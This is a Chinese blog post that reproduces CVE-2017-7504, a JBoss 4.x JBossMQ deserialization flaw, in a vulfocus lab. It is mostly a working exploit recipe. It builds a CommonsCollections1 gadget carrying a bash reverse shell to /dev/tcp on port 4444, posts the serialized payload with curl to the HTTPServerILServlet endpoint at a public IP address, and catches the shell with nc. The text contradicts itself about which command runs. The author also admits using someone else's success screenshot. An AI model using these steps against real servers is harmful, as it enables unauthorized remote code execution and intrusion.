# jboss反序列化漏洞(CVE-2017-7504) - Xor0ne - 博客园

> 原文：[https://www.cnblogs.com/Xor0ne/p/13405398.html](https://www.cnblogs.com/Xor0ne/p/13405398.html)

# jboss反序列化漏洞(CVE-2017-7504)

参考链接：

> 作者：木讷
> 名字：漏洞复现之JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）
> 参考链接：https://www.cnblogs.com/iamver/p/11282928.html

# 1、漏洞描述

Jboss AS 4.x及之前版本中,JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞,远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。

环境：vulfocus/CVE-2017-7504

# 2、漏洞复现

*   1、下载工具：

```
https://github.com/joaomatosf/JavaDeserH2HC.git

```

*   2、我们选择一个Gadget：ExampleCommonsCollections1WithHashMap,编译并生成序列化数据:

```
javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java

java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "bash -i >& /dev/tcp/192.168.10.130/4444 0>&1"

```

可见,我们执行的命令是`touch /tmp/success`。执行完成后,将生成一个文件ExampleCommonsCollections1WithHashMap.ser
![在这里插入图片描述](../Images/1fa858e28480cc3457d5adf7ebd52da1.png)

*   3、发送payload

```
curl http://118.193.36.37:61821/jbossmq-httpil/HTTPServerILServlet  --data-binary @ExampleCommonsCollections1WithHashMap.ser
```

![在这里插入图片描述](../Images/e154224b4eeb65bc66a996dc77d471af.png)
上传成功。

*   4、监听端口

```
nc -lnvp 4444

```

到这里基本上就结束了，额，但是我的页面卡住了，所以就盗了一张成功的图啦！

![在这里插入图片描述](../Images/752b741519df047d8d9d5169fdfb4459.png)